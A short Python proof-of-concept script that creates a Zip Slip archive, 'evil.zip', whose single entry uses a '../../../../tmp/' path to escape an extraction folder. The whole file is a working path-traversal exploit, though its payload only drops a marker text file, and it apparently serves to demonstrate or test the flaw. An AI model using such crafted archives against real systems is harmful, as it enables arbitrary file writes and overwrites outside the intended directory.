import zipfile

# This filename tries to escape the uploads folder
# On Linux, ../../../tmp/ is 3 levels up
malicious_file = '../../../../tmp/pwned_by_sheila.txt'

with zipfile.ZipFile('evil.zip', 'w') as z:
    z.writestr(malicious_file, 'Sheila was here! Zip Slip works!')

print(f"[*] Created evil.zip containing file: {malicious_file}")
print("[*] Run: zipinfo evil.zip -> you will see the evil path")
